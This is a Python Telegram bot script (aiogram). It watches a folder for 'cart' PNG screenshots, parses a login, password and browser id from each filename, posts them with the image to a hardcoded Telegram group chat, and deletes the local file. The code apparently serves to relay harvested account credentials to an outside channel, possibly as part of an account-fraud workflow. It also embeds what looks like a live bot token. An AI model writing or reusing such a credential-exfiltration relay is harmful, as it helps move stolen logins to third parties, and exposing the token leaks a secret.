import os
import re
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor


# Initialize the bot and dispatcher
bot = Bot(token="5935972224:AAHPSn9VUarSD7E3wPsNGlYK1WRAhgCwyAA")
dp = Dispatcher(bot)

# Regular expression pattern to extract login and password
pattern = r"cart\((.*?)\)\((.*?)\)\((.*?)\)\.png"
regex = re.compile(pattern)
# Get the current working directory
working_dir = os.getcwd()


async def send_files():
    while True:
      # Iterate over files in the working directory
      for file_name in os.listdir(working_dir):
          if file_name.endswith('.png') and file_name.startswith('cart'):
              # Extract login and password using regex
              match = regex.match(file_name)
              if match:
                  login = match.group(1)
                  password = match.group(2)
                  ads_id = match.group(3)

                  # Prepare the file path
                  file_path = os.path.join(working_dir, file_name)
                  caption = f"login: {login}\npassword: {password}\nbrowser id: {ads_id}"
                  # Send the file to the group chat
                  with open(file_path, 'rb') as file:
                    input_file = types.InputFile(file)
                    await bot.send_photo(chat_id="-924528169", photo=input_file, caption=caption)

                  
                  os.remove(file_path)


async def on_startup(_):
    await send_files()


if __name__ == '__main__':
    executor.start_polling(dp, on_startup=on_startup)